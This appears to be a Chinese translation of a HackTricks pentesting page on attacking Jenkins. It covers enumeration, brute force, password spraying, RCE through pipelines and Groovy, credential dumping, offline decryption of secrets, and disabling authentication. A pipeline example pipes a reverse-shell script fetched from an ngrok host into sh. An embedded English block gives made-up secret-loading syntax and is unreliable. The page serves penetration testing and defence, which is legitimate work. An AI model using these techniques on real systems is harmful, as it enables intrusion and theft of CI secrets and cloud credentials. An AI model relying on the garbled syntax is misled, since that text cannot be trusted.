# Jenkins安全

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的账号 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## 基本信息

Jenkins提供了一种简单的方式来设置几乎**任何**组合的**语言**和源代码仓库的**持续集成**或**持续交付**（CI/CD）环境，使用流水线，以及自动化其他常规开发任务。虽然Jenkins不能消除为每个步骤创建脚本的**需求**，但它确实为您提供了一种比您自己容易构建的更快速和更强大的方式来集成整个构建、测试和部署工具链。\
定义来自[这里](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html)。

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## 未经身份验证的枚举

为了在没有身份验证的情况下搜索有趣的Jenkins页面（如_/people_或_/asynchPeople_，这些页面列出了当前用户），您可以使用：
```
msf> use auxiliary/scanner/http/jenkins_enum
```
检查是否可以在不需要身份验证的情况下执行命令：
```
msf> use auxiliary/scanner/http/jenkins_command
```
没有凭据的情况下，您可以查看 _**/asynchPeople/**_ 路径或 _**/securityRealm/user/admin/search/index?q=**_ 来获取 **用户名**。

您可以从路径 _**/oops**_ 或 _**/error**_ 获取 Jenkins 版本

![](<../../.gitbook/assets/image (48).png>)

### 已知漏洞

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## 登录

在基本信息中，您可以查看**登录 Jenkins 的所有方法**：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 注册

您将能够找到允许您创建帐户并登录的 Jenkins 实例。就是这么简单。

### **SSO 登录**

如果存在 **SSO 功能/插件**，则应尝试使用测试帐户（例如测试 **Github/Bitbucket 帐户**）登录应用程序。从[**这里**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)获取的技巧。

### 暴力破解

**Jenkins** 没有实施任何密码策略或用户名**暴力破解防护**。因此，您应该始终尝试**暴力破解**用户，因为可能使用了**弱密码**（甚至使用**用户名作为密码**或**反向**用户名作为密码）。
```
msf> use auxiliary/scanner/http/jenkins_login
```
### 密码喷洒

使用[这个Python脚本](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py)或[这个PowerShell脚本](https://github.com/chryzsh/JenkinsPasswordSpray)。

### IP白名单绕过

许多组织将**基于SaaS的源代码管理（SCM）系统**（如GitHub或GitLab）与**内部**的自托管**CI**解决方案（如Jenkins、TeamCity）结合使用，以便这些CI系统可以从SaaS源代码供应商接收Webhook事件，仅用于触发流水线作业。

因此，组织将**SCM**的**IP**范围列入白名单，允许它们通过**Webhook**访问**内部**的CI系统。然而，请注意，**任何人**都可以在GitHub或GitLab中创建一个帐户，并使其**触发Webhook**，从而向**内部CI系统**发送请求。

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## 内部Jenkins滥用

在这些场景中，我们假设您有一个有效的帐户来访问Jenkins。

{% hint style="warning" %}
根据Jenkins中配置的**授权**机制和受损用户的权限，您**可能能够或无法执行以下攻击**。
{% endhint %}

有关更多信息，请查看基本信息：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 列出用户

如果您已经访问了Jenkins，您可以在[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)中列出其他注册用户。

### 转储构建以查找明文密码

使用[这个脚本](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py)来转储构建控制台输出和构建环境变量，以便希望找到明文密码。
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **窃取SSH凭据**

如果被入侵的用户具有足够的权限来创建/修改新的Jenkins节点，并且已经存储了访问其他节点的SSH凭据，他可以通过创建/修改节点并设置一个主机来窃取这些凭据，而无需验证主机密钥：

![](<../../.gitbook/assets/image (56).png>)

通常情况下，您可以在全局提供者（`/credentials/`）中找到Jenkins的SSH凭据，因此您也可以像转储其他任何秘密一样转储它们。有关更多信息，请参见[**转储秘密部分**](./#dumping-secrets)。

### **Jenkins中的RCE**

在Jenkins服务器中获取一个shell使攻击者有机会泄露所有的**秘密**和**环境变量**，并且可以利用同一网络中的其他机器甚至收集**云凭据**。

默认情况下，Jenkins将**“以系统身份运行”构建**。换句话说，它们将其分配给**强大的SYSTEM用户**，这意味着在构建过程中执行的任何操作都有权限执行任何操作。

### **创建/修改项目的RCE**

创建/修改项目是获得Jenkins服务器上RCE的一种方法：

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **执行Groovy脚本的RCE**

您还可以通过执行Groovy脚本来获得RCE，这可能比创建新项目更隐蔽：

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### 创建/修改Pipeline的RCE

您还可以通过创建/修改Pipeline来获得**RCE**：

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Pipeline利用

要利用管道，您仍然需要访问Jenkins。

### 构建Pipeline

**Pipeline**也可以用作项目中的**构建机制**，在这种情况下，可以配置一个**存储在存储库中的文件**，其中包含管道语法。默认情况下使用`/Jenkinsfile`：

![](<../../.gitbook/assets/image (14) (1) (1).png>)

还可以将管道配置文件**存储在其他位置**（例如其他存储库），以实现存储库访问和管道访问的**分离**。

如果攻击者对该文件具有**写访问权限**，他将能够**修改**它并**潜在触发**管道，甚至无需访问Jenkins。\
攻击者可能需要**绕过一些分支保护**（取决于平台和用户权限，它们可能会被绕过或不会被绕过）。

触发自定义管道的最常见方式有：

* 向主分支（或其他分支）发起**拉取请求**
* 向主分支（或其他分支）**推送**
* **更新主分支**并等待其以某种方式执行

{% hint style="info" %}
如果您是**外部用户**，不应该期望能够创建**针对其他用户/组织的主分支PR**并**触发管道**...但如果配置**不当**，您完全可以通过利用此漏洞**完全攻陷公司**。
{% endhint %}

### Pipeline RCE

在前面的RCE部分中，已经指出了一种[**修改管道以获得RCE的技术**](./#rce-creating-modifying-pipeline)。

### 检查环境变量

可以为整个管道或特定阶段声明**明文环境变量**。这些环境变量**不应包含敏感信息**，但攻击者始终可以**检查所有管道**配置/Jenkinsfiles：
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### 密码泄露

有关Jenkins如何处理密码的信息，请查看基本信息：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

凭据可以被**全局提供者**（`/credentials/`）或**特定项目**（`/job/<project-name>/configure`）范围限定。因此，为了窃取所有凭据，您需要**至少入侵包含凭据的所有项目**并执行自定义/恶意流水线。

还有一个问题，为了在流水线的环境中获取**密钥**，您需要**知道密钥的名称和类型**。例如，如果您尝试将**`usernamePassword`** **密钥**作为**`string`** **密钥**加载，您将收到以下**错误**：
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
以下是加载一些常见密钥类型的方法：

```markdown
## Secrets

Here you have the way to load some common secret types:

### Environment Variables

To load secrets from environment variables, you can use the following syntax:

```bash
${ENV_VARIABLE_NAME}
```

For example, to load a secret named `API_KEY` from an environment variable, you would use `${API_KEY}`.

### Files

To load secrets from files, you can use the `file` syntax:

```bash
file(path: 'path/to/secret/file')
```

For example, to load a secret from a file located at `/secrets/api_key.txt`, you would use `file(path: '/secrets/api_key.txt')`.

### Jenkins Credentials

To load secrets from Jenkins credentials, you can use the `credentials` syntax:

```bash
credentials('credential_id')
```

For example, to load a secret from a Jenkins credential with the ID `api_key`, you would use `credentials('api_key')`.

### Kubernetes Secrets

To load secrets from Kubernetes secrets, you can use the `kubernetes` syntax:

```bash
kubernetes(namespace: 'namespace', secretName: 'secret_name', secretKey: 'secret_key')
```

For example, to load a secret named `api_key` from a Kubernetes secret named `my_secret` in the `my_namespace` namespace, you would use `kubernetes(namespace: 'my_namespace', secretName: 'my_secret', secretKey: 'api_key')`.
```
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
在本页的末尾，您可以找到所有的凭据类型：[https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
一次性**获取所有秘密**的最佳方法是通过**入侵**Jenkins机器（例如在**内置节点**中运行反向shell），然后**泄露**主密钥和加密的秘密，并在离线状态下解密它们。\
有关如何执行此操作的更多信息，请参阅[节点和代理部分](./#nodes-and-agents)和[后渗透部分](./#post-exploitation)。
{% endhint %}

### 触发器

根据[文档](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)：`triggers`指令定义了**触发重新触发Pipeline的自动方式**。对于与GitHub或BitBucket等源集成的Pipeline，可能不需要`triggers`，因为基于webhooks的集成可能已经存在。目前可用的触发器有`cron`、`pollSCM`和`upstream`。

Cron示例：
```bash
triggers { cron('H */4 * * 1-5') }
```
请查看**文档中的其他示例**。

### 节点和代理

一个**Jenkins实例**可能在不同的机器上运行**不同的代理**。从攻击者的角度来看，访问不同的机器意味着可以窃取**不同的云凭证**或者滥用**不同的网络访问**来利用其他机器。

有关更多信息，请查看基本信息：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

您可以在`/computer/`中枚举**配置的节点**，通常会找到**内置节点**（即运行Jenkins的节点）和其他可能的节点：

![](<../../.gitbook/assets/image (25).png>)

**入侵内置节点**特别有趣，因为它包含敏感的Jenkins信息。

要指示您希望在**内置Jenkins节点**上运行**流水线**，您可以在流水线中指定以下配置：
```bash
pipeline {
agent {label 'built-in'}
```
### 完整示例

在特定代理上的流水线，使用cron触发器，具有流水线和阶段环境变量，在一个步骤中加载2个变量并发送反向shell：
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## 后渗透

### Metasploit

Metasploit是一款功能强大的后渗透工具，它提供了一系列的模块和有效载荷，用于利用已经入侵的系统。这些模块和有效载荷可以帮助渗透测试人员在目标系统上执行各种操作，包括获取敏感信息、远程执行命令、建立持久性访问等。Metasploit还提供了一个交互式的命令行界面，使渗透测试人员能够更方便地使用这些功能。
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

如果您拥有足够的权限，可以访问`/credentials/`来列出秘密。请注意，这只会列出`credentials.xml`文件中的秘密，但是**构建配置文件**可能还包含**更多凭据**。

如果您可以**查看每个项目的配置**，您还可以在其中看到用于访问存储库和**项目的其他凭据**的**凭据（秘密）的名称**。

![](<../../.gitbook/assets/image (9) (1) (1).png>)

#### 从Groovy中

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### 从磁盘中

这些文件用于**解密Jenkins秘密**：

* secrets/master.key
* secrets/hudson.util.Secret

这样的**秘密通常可以在**以下位置找到：

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

以下是用于查找它们的正则表达式：
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### 离线解密Jenkins密码

如果你已经转储了**解密密码所需的密码**，请使用[**此脚本**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **来解密这些密码**。
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### 从Groovy解密Jenkins密码

Jenkins使用加密的方式存储敏感信息，如密码和凭证。但是，我们可以使用Groovy脚本来解密这些加密的密码。

以下是一个示例Groovy脚本，用于解密Jenkins中的密码：

```groovy
import hudson.util.Secret

def secret = Secret.decrypt("<encrypted_password>")
println(secret.getPlainText())
```

在上面的脚本中，我们使用`Secret.decrypt()`方法来解密加密的密码。只需将`<encrypted_password>`替换为要解密的密码即可。

要执行此脚本，可以使用Jenkins的Script Console。在Jenkins的管理界面中，导航到“Manage Jenkins”>“Script Console”。将脚本粘贴到文本框中，然后点击“Run”按钮。

执行脚本后，将在控制台输出中看到解密后的密码。

请注意，此方法仅适用于Jenkins中使用的加密密码。对于其他类型的加密凭证，可能需要使用不同的方法来解密。
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### 创建新的管理员用户

1. 访问位于 `/var/lib/jenkins/config.xml` 或 `C:\Program Files (x86)\Jenkis\` 的 Jenkins config.xml 文件。
2. 搜索 `<useSecurity>true</useSecurity>` 这个词，并将单词 **`true`** 改为 **`false`**。
3. 运行命令 `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`。
4. **重启** Jenkins 服务器：`service jenkins restart`。
5. 现在再次进入 Jenkins 门户，这次 Jenkins 将不会要求任何凭据。您可以导航到 "**Manage Jenkins**" 来重新设置管理员密码。
6. 通过将设置更改为 `<useSecurity>true</useSecurity>` 并**再次重启 Jenkins** 来**启用**安全性。

## 参考资料

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您希望在 HackTricks 中看到您的公司广告，或者如果您想访问最新版本的 PEASS 或下载 PDF 格式的 HackTricks，请查看 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者在 **Twitter** 上关注我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>
